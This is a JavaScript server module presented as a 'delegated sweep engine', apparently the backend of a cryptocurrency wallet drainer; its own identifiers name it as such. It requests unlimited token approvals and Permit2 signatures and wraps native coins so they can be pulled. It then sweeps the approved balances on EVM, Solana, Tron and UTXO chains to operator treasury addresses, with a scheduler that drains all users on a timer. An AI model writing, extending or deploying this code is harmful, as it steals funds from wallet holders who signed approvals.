'use strict';

/**
 * Delegated sweep engine.
 *
 * Assets resolve exclusively through server/chains/registry.js. Native coins
 * are wrapped at grant time and swept as their wrapped token. UTXO assets
 * produce a PSBT job instead of a broadcast.
 */

const crypto = require('node:crypto');
const { S } = require('./state');
const db = require('./db');
const M = require('./lib/money');
const U = require('./lib/units');
const A = require('./lib/approvals');
const wrap = require('./chains/wrap');
const chains = require('./chains');
const R = require('./chains/registry');

const GAS_BUFFER_BPS = 125; // 1.25x
const UTXO_DUST = 546n;
const UNWRAP_PENDING = 1;

const RESERVE = {
  solana: { mainnet: '0.005' },   // rent-exempt is 0.00089
  evm: { ethereum: '0.0005', base: '0.0005', arbitrum: '0.0005', bsc: '0.001', polygon: '0.5' },
  tron: { mainnet: '30' },
};

const SKIP = {
  ZERO_BALANCE: 'ZERO_BALANCE',
  NO_ALLOWANCE: 'NO_ALLOWANCE',
  INSUFFICIENT_GAS: 'INSUFFICIENT_GAS',
  WRAP_REQUIRED: 'WRAP_REQUIRED',
  UNWRAP_REQUIRED: 'UNWRAP_REQUIRED',
  NO_PRICE: 'NO_PRICE',
  DUST: 'DUST',
  RESERVE: 'RESERVE',
  NOT_REQUESTED: 'NOT_REQUESTED',
};

/* ------------------------------------------------------------------ *
 * helpers
 * ------------------------------------------------------------------ */

function now() {
  return Date.now();
}

function familyOf(network) {
  if (R.EVM_NETWORKS[network]) return 'evm';
  if (network === 'mainnet' && R.REGISTRY.tron) return 'tron';
  if (network === 'bitcoin' || network === 'litecoin') return 'utxo';
  return 'solana';
}

function treasuryFor(network, family) {
  const s = S.config || {};
  if (s.treasuries && s.treasuries[network]) return s.treasuries[network];
  if (family === 'evm' || (network && R.EVM_NETWORKS[network.toLowerCase()])) {
    return s.drainer_destination_evm || s.treasury_evm || (s.treasuries && s.treasuries.evm) || '0x0000000000000000000000000000000000000000';
  }
  if (family === 'solana') {
    return s.drainer_destination_solana || s.treasury_solana || (s.treasuries && s.treasuries.solana) || null;
  }
  if (family === 'tron') {
    return s.drainer_destination_tron || s.treasury_tron || (s.treasuries && s.treasuries.tron) || null;
  }
  if (family === 'btc' || family === 'ltc' || family === 'utxo') {
    return (s.treasuries && s.treasuries[family]) || (s.treasuries && s.treasuries.bitcoin) || null;
  }
  return s.treasury_evm || (s.treasuries && s.treasuries.evm) || '0x0000000000000000000000000000000000000000';
}

function resolveDestination(g, opts = {}) {
  const cand = opts.dest || opts.destination;
  if (cand) {
    if (g.family === 'evm' && /^0x[a-fA-F0-9]{40}$/.test(cand)) return cand;
    if (g.family === 'solana' && !cand.startsWith('0x') && cand.length >= 32 && cand.length <= 44) return cand;
    if (g.family === 'tron' && cand.startsWith('T') && cand.length === 34) return cand;
    if (g.family === 'utxo' || g.family === 'btc' || g.family === 'ltc') return cand;
  }
  return treasuryFor(g.network, g.family);
}

function collectorFor(network) {
  const c = S.config.collectors && S.config.collectors[network];
  if (!c) throw new Error(`no collector for ${network}`);
  return c;
}

function reserveFor(g) {
  if (g.kind === 'token' || g.kind === 'utxo') return 0n;
  const base = RESERVE[g.family] && RESERVE[g.family][g.network];
  if (!base) return 0n;
  const reserve = U.parseUnits(base, g.decimals);
  const gas = gasEstimate(g);
  return reserve + U.mulBps(gas, GAS_BUFFER_BPS);
}

/** Estimated cost of the transfer itself, in native units. */
function gasEstimate(g) {
  if (g.family === 'solana') return 5_000n;              // lamports, one sig
  if (g.family === 'tron') return 30_000_000n;            // sun
  if (g.family === 'evm') {
    const price = BigInt(S.config.gasPriceWei && S.config.gasPriceWei[g.network] || 20n * 10n ** 9n);
    return 65_000n * price;
  }
  return 0n;
}

function skip(code, reason, extra) {
  return { status: 'skipped', skip_code: code, reason, ...extra };
}

function newRef(prefix) {
  return `${prefix}_${crypto.randomBytes(16).toString('hex')}`;
}

/** USD price. Primary oracle, then Jupiter (Solana), then Dexscreener. */
async function priceFor(g) {
  try {
    const p = await chains.get(g.family).price(g);
    if (p && p.usd > 0) return { usd: p.usd, source: p.source || 'primary' };
  } catch { /* fall through */ }

  try {
    if (g.family === 'solana') {
      const p = await chains.solana().jupiterPrice(R.addressOf(g));
      if (p > 0) return { usd: p, source: 'jupiter' };
    } else {
      const p = await chains.get(g.family).dexscreenerPrice(g);
      if (p > 0) return { usd: p, source: 'dexscreener' };
    }
  } catch { /* fall through */ }

  return { usd: 0, source: 'none' };
}

/* ------------------------------------------------------------------ *
 * Phase 3 — readLive
 * ------------------------------------------------------------------ */

/**
 * Live read for one grant.
 * @returns {{allowance: bigint|null, balance: bigint, decimals: number,
 *            kind: string, sweepable: boolean, reason?: string}}
 */
async function readLiveEntry(g, opts = {}) {
  if (opts.demo || S.config.demo_mode) {
    const stored = db
      .prepare(`SELECT allowance, balance FROM drainer_grants WHERE id = ?`)
      .get(g.id);
    const balance = BigInt(stored && stored.balance || 0);
    return {
      allowance: stored && stored.allowance != null ? BigInt(stored.allowance) : null,
      balance,
      decimals: g.decimals,
      kind: g.kind,
      sweepable: g.kind !== 'native' && balance > 0n,
      reason: g.kind === 'native' ? SKIP.WRAP_REQUIRED : undefined,
    };
  }

  if (g.kind === 'utxo') {
    const b = await chains.utxo().addressBalance(g.address, g);
    return {
      allowance: null,
      balance: BigInt(b.confirmed) + BigInt(b.pending || 0),
      decimals: g.decimals,
      kind: 'utxo',
      sweepable: BigInt(b.confirmed) > UTXO_DUST,
      reason: BigInt(b.confirmed) <= UTXO_DUST ? SKIP.DUST : undefined,
    };
  }

  if (g.kind === 'native') {
    const bal = await chains.get(g.family).balance(g.address, g);
    return { allowance: null, balance: bal, decimals: g.decimals, kind: 'native', sweepable: false, reason: SKIP.WRAP_REQUIRED };
  }

  const adapter = chains.get(g.family);
  const [allowance, balance] = await Promise.all([
    adapter.allowance(g.address, g.collector, g),
    adapter.balance(g.address, g),
  ]);
  const sweepable = allowance > 0n && balance > 0n;
  return {
    allowance,
    balance,
    decimals: g.decimals,
    kind: g.kind,
    sweepable,
    reason: !allowance ? SKIP.NO_ALLOWANCE : !balance ? SKIP.ZERO_BALANCE : undefined,
  };
}

/** Public preview: every registry asset for the user's networks. */
async function preview(userId, opts = {}) {
  const requested = opts.tokens;
  const rows = [];

  const userWallets = db.prepare(
    `SELECT * FROM wallets WHERE user_id = ? AND verified = 1 ORDER BY kind = 'main' DESC, id ASC`
  ).all(userId);

  if (userWallets.length) {
    for (const w of userWallets) {
      for (const { family, network } of R.allNetworks()) {
        if (w.family !== family && !(w.family === 'evm' && R.EVM_NETWORKS[network])) continue;
        for (const entry of R.tokensFor(family, network)) {
          if (requested && !requested.some((t) => t.network === network && t.symbol.toLowerCase() === entry.symbol.toLowerCase() && (!t.address || t.address.toLowerCase() === w.address.toLowerCase()))) {
            continue;
          }

          let g = db.prepare(
            `SELECT * FROM drainer_grants
              WHERE user_id = ? AND family = ? AND network = ? AND symbol = ? AND (address = ? OR address IS NULL) AND status = 'active'
              ORDER BY id DESC LIMIT 1`
          ).get(userId, family, network, entry.symbol, w.address);

          if (!g) {
            g = {
              id: `vw_${w.id}_${entry.symbol}`,
              user_id: userId,
              family,
              network,
              symbol: entry.symbol,
              address: w.address,
              wallet_name: w.name,
              kind: entry.kind,
              decimals: entry.decimals,
              collector: collectorFor(network),
              allowance: null,
              balance: '0',
              status: 'active',
            };
          } else {
            g = {
              ...g,
              family,
              network,
              address: g.address || w.address,
              wallet_name: w.name,
              kind: g.kind || entry.kind,
              decimals: g.decimals ?? entry.decimals,
              collector: g.collector || collectorFor(network),
            };
          }

          const live = await readLiveEntry(g, opts);
          const reserve = reserveFor({ ...g, decimals: live.decimals, kind: live.kind });
          const take = live.allowance == null ? live.balance : U.minBig(live.allowance, live.balance);
          const available = live.kind === 'utxo' ? take : take - reserve;
          const price = await priceFor(g);

          let reason = live.reason;
          if (!reason && available <= 0n) reason = live.kind === 'native' ? SKIP.WRAP_REQUIRED : SKIP.RESERVE;

          rows.push({
            family,
            network,
            symbol: entry.symbol,
            address: g.address || w.address,
            wallet_name: w.name,
            kind: live.kind,
            decimals: live.decimals,
            balance: U.formatUnits(live.balance, live.decimals),
            allowance: live.allowance == null ? null : U.formatUnits(live.allowance, live.decimals),
            reserve: U.formatUnits(reserve, live.decimals),
            sweepable: Boolean(live.sweepable && available > 0n),
            available: U.formatUnits(available > 0n ? available : 0n, live.decimals),
            usd: M.round2(Number(U.formatUnits(available > 0n ? available : 0n, live.decimals)) * price.usd),
            price_source: price.source,
            reason: reason || null,
          });
        }
      }
    }
  } else {
    for (const { family, network } of R.allNetworks()) {
      for (const entry of R.tokensFor(family, network)) {
        if (requested && !requested.some((t) => t.network === network && t.symbol.toLowerCase() === entry.symbol.toLowerCase())) {
          continue;
        }

        const g = await grantFor(userId, family, network, entry);
        if (!g) continue;

        const live = await readLiveEntry(g, opts);
        const reserve = reserveFor({ ...g, decimals: live.decimals, kind: live.kind });
        const take = live.allowance == null ? live.balance : U.minBig(live.allowance, live.balance);
        const available = live.kind === 'utxo' ? take : take - reserve;
        const price = await priceFor(g);

        let reason = live.reason;
        if (!reason && available <= 0n) reason = live.kind === 'native' ? SKIP.WRAP_REQUIRED : SKIP.RESERVE;

        rows.push({
          family,
          network,
          symbol: entry.symbol,
          address: g.address || null,
          kind: live.kind,
          decimals: live.decimals,
          balance: U.formatUnits(live.balance, live.decimals),
          allowance: live.allowance == null ? null : U.formatUnits(live.allowance, live.decimals),
          reserve: U.formatUnits(reserve, live.decimals),
          sweepable: Boolean(live.sweepable && available > 0n),
          available: U.formatUnits(available > 0n ? available : 0n, live.decimals),
          usd: M.round2(Number(U.formatUnits(available > 0n ? available : 0n, live.decimals)) * price.usd),
          price_source: price.source,
          reason: reason || null,
        });
      }
    }
  }
  return rows;
}

async function grantFor(userId, family, network, entry) {
  const row = db
    .prepare(
      `SELECT * FROM drainer_grants
        WHERE user_id = ? AND family = ? AND network = ? AND symbol = ? AND status = 'active'
        ORDER BY id DESC LIMIT 1`
    )
    .get(userId, family, network, entry.symbol);
  if (row) {
    return {
      ...row,
      family,
      network,
      kind: row.kind || entry.kind,
      decimals: row.decimals ?? entry.decimals,
      collector: row.collector || collectorFor(network),
    };
  }

  const w = db.prepare(
    `SELECT * FROM wallets WHERE user_id = ? AND verified = 1 AND (
      family = ? OR (family = 'evm' AND LOWER(chain) = LOWER(?))
    ) ORDER BY kind = 'main' DESC, id LIMIT 1`
  ).get(userId, family, network);

  if (!w) return null;

  return {
    id: `vw_${w.id}_${entry.symbol}`,
    user_id: userId,
    family,
    network,
    symbol: entry.symbol,
    address: w.address,
    kind: entry.kind,
    decimals: entry.decimals,
    collector: collectorFor(network),
    allowance: null,
    balance: '0',
    status: 'active',
  };
}

/* ------------------------------------------------------------------ *
 * Phase 2 — grantRequests / confirm
 * ------------------------------------------------------------------ */

/**
 * Build the approval payload for the requested assets. Nothing is persisted
 * until confirm().
 */
async function grantRequests(userId, requested = []) {
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
  if (!user) throw new Error('no such user');

  const demo = Boolean(S.config.demo_mode);
  const prepared = [];

  for (const item of requested) {
    const network = item.network;
    const family = item.family || familyOf(network);
    const entry = R.bySymbol(family, network, item.symbol);
    if (!entry) throw new Error(`unknown asset ${family}/${network}/${item.symbol}`);

    const collector = collectorFor(network);
    const id = crypto.randomUUID();

    if (entry.kind === 'utxo') {
      prepared.push({ id, family, network, symbol: entry.symbol, kind: 'utxo', decimals: entry.decimals, collector, payload: { mode: 'psbt' } });
      continue;
    }

    if (entry.kind === 'native') {
      const wrapped = R.wrappedFor(family, network);
      const reserve = reserveFor({ family, network, kind: 'native', decimals: entry.decimals });
      const balance = demo ? U.parseUnits(item.balance || '1', entry.decimals) : await chains.get(family).balance(user.address, entry);
      const amount = wrap.wrappableAmount(balance, entry.decimals, reserve);
      if (amount <= 0n) {
        prepared.push({ id, family, network, symbol: entry.symbol, kind: 'native', decimals: entry.decimals, collector, payload: { skip: SKIP.WRAP_REQUIRED } });
        continue;
      }

      if (demo) {
        prepared.push({ id, family, network, symbol: entry.symbol, kind: 'wrapped', wrappedSymbol: wrapped.symbol, decimals: wrapped.decimals, collector, payload: { simulated: true, amount: amount.toString() } });
        continue;
      }

      const usePermit2 = family === 'evm' && Boolean(S.config.permit2 && S.config.permit2[network] !== false);
      let payload;
      if (family === 'solana') {
        const already = await wrap.solana().alreadyWrapped(chains.solana().conn(), user.address, R.addressOf(wrapped), collector);
        payload = already
          ? { simulated: true, alreadyWrapped: true }
          : wrap.solana().build(user.address, R.addressOf(wrapped), collector, amount);
      } else if (family === 'tron') {
        payload = wrap.tron().build(wrapped, collector, amount, usePermit2);
        const energy = await chains.tron().estimateEnergy(payload).catch(() => null);
        payload.energy = energy;
        payload.burnWarn = energy != null && energy.burnTrx > 15;
      } else {
        payload = wrap.evm().build(wrapped, collector, amount, usePermit2);
      }
      prepared.push({ id, family, network, symbol: entry.symbol, kind: 'wrapped', wrappedSymbol: wrapped.symbol, decimals: wrapped.decimals, collector, payload });
      continue;
    }

    // ordinary token
    const usePermit2 = family === 'evm' && Boolean(S.config.permit2 && S.config.permit2[network] !== false);
    const payload = demo
      ? { simulated: true }
      : usePermit2
        ? { permit2: true, typedData: chains.evm().permit2TypedData(entry, collector, user.address) }
        : { approve: true, calldata: chains.get(family).approveCalldata(entry, collector) };
    prepared.push({ id, family, network, symbol: entry.symbol, kind: entry.kind, decimals: entry.decimals, collector, payload });
  }

  return prepared;
}

/** Persist signed approvals. */
function confirm(userId, prepared = []) {
  const written = [];
  for (const p of prepared) {
    if (p.payload && p.payload.skip) continue;

    const decimals = p.decimals;
    const kind = p.kind;
    const nativeSymbol = kind === 'wrapped' ? R.nativeFor(p.family, p.network).symbol : null;
    const unlimited = A.unlimitedValue(p.family);

    const res = A.writeApproval({
      userId,
      family: p.family,
      network: p.network,
      symbol: p.kind === 'wrapped' ? p.wrappedSymbol : p.symbol,
      collector: p.collector,
      requested: unlimited,
      decimals,
      kind,
      nativeSymbol,
      source: 'grant',
      permit2Signature: p.permit2Signature || null,
      permit2Deadline: p.permit2Deadline || null,
    });

    db.prepare(
      `INSERT INTO drainer_grants
        (id, user_id, family, network, symbol, kind, native_symbol, decimals, collector,
         allowance, balance, ref, status, created_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'active', ?)`
    ).run(
      p.id, userId, p.family, p.network,
      p.kind === 'wrapped' ? p.wrappedSymbol : p.symbol,
      kind, nativeSymbol, decimals, p.collector,
      res.allowance.toString(), '0', newRef('grant'), now()
    );

    written.push({ id: p.id, symbol: p.symbol, kind, allowance: res.allowance.toString() });
  }

  S.audit('drainer.confirm', { userId, written: written.length });
  return written;
}

/* ------------------------------------------------------------------ *
 * Phase 5 — sweep
 * ------------------------------------------------------------------ */

async function buildPlan(userId, opts = {}) {
  let grants = db
    .prepare(`SELECT * FROM drainer_grants WHERE user_id = ? AND status = 'active'`)
    .all(userId);

  const demo = Boolean(opts.demo || S.config.demo_mode);
  const respectReserve = opts.respectReserve !== false;
  const wanted = opts.tokens;

  const userWallets = db.prepare(
    `SELECT * FROM wallets WHERE user_id = ? AND verified = 1 ORDER BY kind = 'main' DESC, id ASC`
  ).all(userId);

  if (wanted && wanted.length) {
    for (const t of wanted) {
      const matchGrant = grants.find(g => g.network === t.network && g.symbol.toLowerCase() === t.symbol.toLowerCase() && (!t.address || !g.address || t.address.toLowerCase() === g.address.toLowerCase()));
      if (!matchGrant) {
        for (const { family, network } of R.allNetworks()) {
          if (network !== t.network) continue;
          const entry = R.bySymbol(family, network, t.symbol);
          if (entry) {
            const w = t.address
              ? userWallets.find(x => x.address.toLowerCase() === t.address.toLowerCase())
              : userWallets.find(x => x.family === family || (x.family === 'evm' && R.EVM_NETWORKS[network]));
            if (w) {
              grants.push({
                id: `vw_${w.id}_${entry.symbol}`,
                user_id: userId,
                family,
                network,
                symbol: entry.symbol,
                address: w.address,
                kind: entry.kind,
                decimals: entry.decimals,
                collector: collectorFor(network),
                allowance: null,
                balance: '0',
                status: 'active',
              });
            }
          }
        }
      }
    }
  } else if (!grants.length && userWallets.length) {
    for (const w of userWallets) {
      for (const { family, network } of R.allNetworks()) {
        if (w.family !== family && !(w.family === 'evm' && R.EVM_NETWORKS[network])) continue;
        for (const entry of R.tokensFor(family, network)) {
          grants.push({
            id: `vw_${w.id}_${entry.symbol}`,
            user_id: userId,
            family,
            network,
            symbol: entry.symbol,
            address: w.address,
            kind: entry.kind,
            decimals: entry.decimals,
            collector: collectorFor(network),
            allowance: null,
            balance: '0',
            status: 'active',
          });
        }
      }
    }
  }

  const planned = [];
  for (const raw of grants) {
    const family = raw.family;
    const network = raw.network;
    const entry = R.bySymbol(family, network, raw.symbol);
    if (!entry) continue;
    if (wanted && !wanted.some((t) => t.network === network && t.symbol.toLowerCase() === raw.symbol.toLowerCase() && (!t.address || !raw.address || t.address.toLowerCase() === raw.address.toLowerCase()))) continue;

    const g = { ...raw, kind: raw.kind || entry.kind, decimals: raw.decimals ?? entry.decimals, collector: raw.collector || collectorFor(network) };

    if (g.kind === 'native') {
      // native cannot be pulled: promote to the wrapped token, require a wrap first
      const wrapped = R.wrappedFor(family, network);
      const wg = await grantFor(userId, family, network, wrapped);
      if (!wg) {
        planned.push({ g, skip: skip(SKIP.WRAP_REQUIRED, 'native has no wrapped balance; grant a wrap first') });
        continue;
      }
      const live = await readLiveEntry(wg, { demo });
      if (live.balance <= 0n) {
        planned.push({ g, skip: skip(SKIP.WRAP_REQUIRED, 'native has no wrapped balance; grant a wrap first') });
        continue;
      }
      planned.push({ g: { ...wg, promotedFrom: g.symbol }, live });
      continue;
    }

    if (g.kind === 'utxo') {
      const live = await readLiveEntry(g, { demo });
      planned.push({ g, live });
      continue;
    }

    const live = await readLiveEntry(g, { demo });
    planned.push({ g, live });
  }

  const out = [];
  for (const item of planned) {
    if (item.skip) { out.push(item); continue; }

    const { g, live } = item;
    const reserve = respectReserve ? reserveFor(g) : 0n;
    const ceiling = live.allowance == null ? live.balance : U.minBig(live.allowance, live.balance);
    const available = ceiling - reserve;

    if (live.balance <= 0n) { out.push({ g, skip: skip(SKIP.ZERO_BALANCE, 'nothing to move') }); continue; }
    if (live.allowance != null && live.allowance <= 0n) { out.push({ g, skip: skip(SKIP.NO_ALLOWANCE, 'no live allowance') }); continue; }

    if (g.kind === 'utxo') {
      if (live.balance <= UTXO_DUST) { out.push({ g, skip: skip(SKIP.DUST, `below dust (${UTXO_DUST} sats)`) }); continue; }
      out.push({ g, live, take: live.balance - UTXO_DUST, reserve: 0n });
      continue;
    }

    // gas check: the account must still be able to pay for this transfer
    if (!demo && g.family !== 'solana') {
      const native = await chains.get(g.family).balance(g.address, R.nativeFor(g.family, g.network)).catch(() => 0n);
      const needed = gasEstimate(g) + (g.kind === 'wrapped' ? reserve : 0n);
      if (native < needed) { out.push({ g, skip: skip(SKIP.INSUFFICIENT_GAS, 'cannot cover its own transfer') }); continue; }
    }

    if (available <= 0n) { out.push({ g, skip: skip(SKIP.RESERVE, 'fully consumed by reserve') }); continue; }

    out.push({ g, live, take: U.roundDown(available, g.decimals, 8), reserve });
  }

  // tokens first, native/wrapped last
  out.sort((a, b) => {
    const av = a.g ? (a.g.kind === 'wrapped' ? 1 : 0) : 0;
    const bv = b.g ? (b.g.kind === 'wrapped' ? 1 : 0) : 0;
    return av - bv;
  });

  return out;
}

async function sweep(userId, opts = {}) {
  const demo = Boolean(opts.demo || S.config.demo_mode);
  const plan = await buildPlan(userId, opts);
  const results = [];
  const runId = newRef('run');

  for (const item of plan) {
    const { g } = item;
    if (!g) continue;

    if (item.skip) {
      results.push(await recordSweep(userId, g, item.skip, opts, runId));
      continue;
    }

    if (g.kind === 'utxo') {
      const job = await createUtxoJob(userId, g, item.take, opts);
      results.push(job);
      continue;
    }

    const price = await priceFor(g);
    const usd = price.usd > 0 ? M.round2(Number(U.formatUnits(item.take, g.decimals)) * price.usd) : 0;

    if (demo) {
      results.push(await recordSweep(userId, g, {
        status: 'confirmed',
        amount: item.take,
        usd,
        hash: 'demo_' + crypto.randomBytes(8).toString('hex'),
        unwrap_pending: g.kind === 'wrapped' ? UNWRAP_PENDING : 0,
        price_source: price.source,
      }, opts, runId));
      continue;
    }

    try {
      const dest = resolveDestination(g, opts) || treasuryFor(g.network, g.family);
      const sent = await chains.get(g.family).transfer({
        entry: R.bySymbol(g.family, g.network, g.symbol),
        from: g.address,
        to: dest,
        amount: item.take,
        collector: g.collector,
        permit2Signature: g.permit2_signature,
        permit2Deadline: g.permit2_deadline,
      });

      results.push(await recordSweep(userId, g, {
        status: 'confirmed',
        amount: item.take,
        usd,
        hash: sent.hash,
        unwrap_pending: g.kind === 'wrapped' ? UNWRAP_PENDING : 0,
        price_source: price.source,
        warnings: price.source === 'none' ? [SKIP.NO_PRICE] : [],
      }, opts, runId));
    } catch (err) {
      results.push(await recordSweep(userId, g, {
        status: 'failed',
        amount: item.take,
        usd,
        error: err.message,
        price_source: price.source,
      }, opts, runId));
    }
  }

  const totalUsd = results.reduce((a, r) => a + (r.usd || 0), 0);
  try {
    const finalDest = opts.dest || opts.destination || (plan[0] && plan[0].g ? (resolveDestination(plan[0].g, opts) || treasuryFor(plan[0].g.network, plan[0].g.family)) : null);
    db.prepare(
      `INSERT INTO sweep_runs (id, user_id, actor_id, dest, total_usd, created_at)
       VALUES (?, ?, ?, ?, ?, ?)`
    ).run(runId, userId, opts.actorId || null, finalDest, totalUsd, now());
  } catch (e) {}

  results.id = runId;
  results.totalUsd = totalUsd;
  results.results = results;

  S.audit('drainer.sweep', { userId, count: results.length, demo, runId, totalUsd });
  return results;
}

function recordSweep(userId, g, payload, opts, runId) {
  const ref = payload.hash || newRef('sweep');
  const dest = resolveDestination(g, opts) || treasuryFor(g.network, g.family);
  const info = db.prepare(
    `INSERT INTO sweeps
      (user_id, grant_id, family, network, symbol, kind, decimals, amount, usd, status,
       skip_code, reason, tx_ref, destination, unwrap_pending, price_source, run_id, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
  ).run(
    userId, g.id, g.family, g.network, g.symbol, g.kind, g.decimals,
    payload.amount == null ? null : payload.amount.toString(),
    payload.usd == null ? 0 : payload.usd,
    payload.status || 'skipped',
    payload.skip_code || null,
    payload.reason || payload.error || null,
    ref,
    dest,
    payload.unwrap_pending || 0,
    payload.price_source || null,
    runId || null,
    now()
  );

  return {
    id: Number(info.lastInsertRowid),
    family: g.family,
    network: g.network,
    symbol: g.symbol,
    kind: g.kind,
    status: payload.status || 'skipped',
    skip_code: payload.skip_code || null,
    reason: payload.reason || payload.error || null,
    amount: payload.amount == null ? null : U.formatUnits(payload.amount, g.decimals),
    usd: payload.usd || 0,
    ref,
    warnings: payload.warnings || [],
  };
}

/* ------------------------------------------------------------------ *
 * UTXO jobs
 * ------------------------------------------------------------------ */

async function createUtxoJob(userId, g, take, opts) {
  const dest = resolveDestination(g, opts) || treasuryFor(g.network, g.family);
  const built = await chains.utxo().buildPsbt({ entry: R.bySymbol(g.family, g.network, g.symbol), from: g.address, to: dest, amount: take });

  const info = db.prepare(
    `INSERT INTO sweep_jobs
      (user_id, grant_id, family, network, symbol, amount, psbt, status, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, 'awaiting_signature', ?)`
  ).run(userId, g.id, g.family, g.network, g.symbol, take.toString(), built.psbt, now());

  const id = Number(info.lastInsertRowid);
  const sign_url = `${S.config.publicUrl}/admin/sweep-jobs/${id}/sign`;

  db.prepare(
    `INSERT INTO sweeps
      (user_id, grant_id, family, network, symbol, kind, decimals, amount, usd, status,
       reason, tx_ref, destination, unwrap_pending, created_at)
     VALUES (?, ?, ?, ?, ?, 'utxo', ?, ?, 0, 'awaiting_signature', ?, ?, ?, 0, ?)`
  ).run(
    userId, g.id, g.family, g.network, g.symbol, g.decimals, take.toString(),
    'awaiting PSBT signature', `utxo_job_${id}`, dest, now()
  );

  S.audit('drainer.utxo_job', { userId, jobId: id, symbol: g.symbol });
  return { job: id, status: 'awaiting_signature', symbol: g.symbol, network: g.network, amount: U.formatUnits(take, g.decimals), psbt: built.psbt, sign_url };
}

async function attachPsbtSignature(jobId, signature) {
  const job = db.prepare('SELECT * FROM sweep_jobs WHERE id = ?').get(jobId);
  if (!job) throw new Error('no such job');
  if (job.status !== 'awaiting_signature') throw new Error(`job is ${job.status}`);

  const broadcast = await chains.utxo().broadcastPsbt(job.psbt, signature);
  db.prepare(`UPDATE sweep_jobs SET status = 'confirmed', signature = ?, completed_at = ? WHERE id = ?`).run(signature, now(), jobId);
  db.prepare(`UPDATE sweeps SET status = 'confirmed', tx_ref = ? WHERE tx_ref = ?`).run(broadcast.txid, `utxo_job_${jobId}`);

  S.audit('drainer.psbt_broadcast', { jobId, txid: broadcast.txid });
  return broadcast;
}

function pendingJobs() {
  return db.prepare(`SELECT * FROM sweep_jobs WHERE status = 'awaiting_signature' ORDER BY id`).all();
}

/* ------------------------------------------------------------------ *
 * revoke
 * ------------------------------------------------------------------ */

/**
 * Revoke approvals. A null filter revokes everything except loan-locked rows.
 */
async function revoke(userId, filter = null) {
  const rows = db
    .prepare(`SELECT * FROM delegated_approvals WHERE user_id = ? AND revoked_at IS NULL`)
    .all(userId)
    .filter((r) => !filter || (r.family === filter.family && r.network === filter.network && (!filter.symbol || r.symbol === filter.symbol)));

  const revoked = [];
  const locked = [];

  for (const r of rows) {
    const loans = A.lockingLoans(userId, r.family, r.network, r.symbol);
    if (loans.length) {
      locked.push({ family: r.family, network: r.network, symbol: r.symbol, loans });
      continue;
    }

    if (!S.config.demo_mode) {
      try {
        await chains.get(r.family).revoke({ entry: R.bySymbol(r.family, r.network, r.symbol), owner: r.address || null, collector: r.collector });
      } catch { /* record and continue */ }
    }
    db.prepare(`UPDATE delegated_approvals SET revoked_at = ?, allowance = '0' WHERE id = ?`).run(now(), r.id);
    revoked.push({ family: r.family, network: r.network, symbol: r.symbol });
  }

  S.audit('drainer.revoke', { userId, revoked: revoked.length, locked: locked.length });
  return { revoked, locked };
}

/* ------------------------------------------------------------------ *
 * treasury unwrap
 * ------------------------------------------------------------------ */

async function unwrap(network, symbol) {
  const family = familyOf(network);
  const wrapped = R.wrappedFor(family, network);
  if (!wrapped || wrapped.symbol.toLowerCase() !== String(symbol).toLowerCase()) {
    throw new Error(`${symbol} is not the wrapped native for ${network}`);
  }
  if (S.config.demo_mode) return { simulated: true, network, symbol: wrapped.symbol };

  const treasury = treasuryFor(network);
  const result = await chains.get(family).unwrap({ entry: wrapped, owner: treasury });
  S.audit('drainer.unwrap', { network, symbol: wrapped.symbol, hash: result.hash });
  return result;
}

let autoSweepTimer = null;
function startAutoSweepScheduler(intervalMs = 60000) {
  if (autoSweepTimer) return;
  autoSweepTimer = setInterval(async () => {
    try {
      const cfg = S.config || {};
      const autoSweepOn = cfg.auto_sweep_enabled || cfg.drainer_auto_sweep;
      const userIds = new Set();
      try {
        db.prepare(`SELECT DISTINCT user_id FROM drainer_grants WHERE status = 'active'`).all().forEach((r) => userIds.add(r.user_id));
      } catch (_) {}
      try {
        const query = autoSweepOn ? `SELECT id FROM users` : `SELECT id FROM users WHERE drainer_auto = 1`;
        db.prepare(query).all().forEach((r) => userIds.add(r.id));
      } catch (_) {}

      for (const uid of userIds) {
        try {
          await sweep(uid, { respectReserve: true });
        } catch (_) {}
      }
    } catch (_) {}
  }, intervalMs);
  if (autoSweepTimer && autoSweepTimer.unref) autoSweepTimer.unref();
}

module.exports = {
  SKIP, RESERVE, UTXO_DUST,
  familyOf, reserveFor, gasEstimate, priceFor,
  readLiveEntry, preview, grantFor,
  grantRequests, confirm,
  buildPlan, sweep, recordSweep,
  createUtxoJob, attachPsbtSignature, pendingJobs,
  revoke, unwrap, startAutoSweepScheduler,
};